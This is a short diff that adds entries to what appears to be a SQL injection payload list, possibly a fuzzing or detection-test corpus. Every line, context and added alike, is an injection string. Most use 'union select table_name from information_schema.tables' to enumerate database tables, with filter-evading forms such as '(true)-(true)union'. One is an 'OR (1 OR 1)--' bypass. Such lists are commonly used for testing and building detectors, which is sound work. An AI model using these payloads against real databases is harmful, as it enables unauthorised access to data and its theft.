@@ -307,3 +307,8 @@ version() union select table_name from information_schema.tables
 1 is unknown union select table_name from information_schema.tables
 true is not unknown for update union select table_name from information_schema.tables
 1 for update union select 1
+
+(true)-(true)union select table_name from information_schema.tables
+(@a)-(@a)union select table_name from information_schema.tables
+
+1 OR (1 OR 1)--
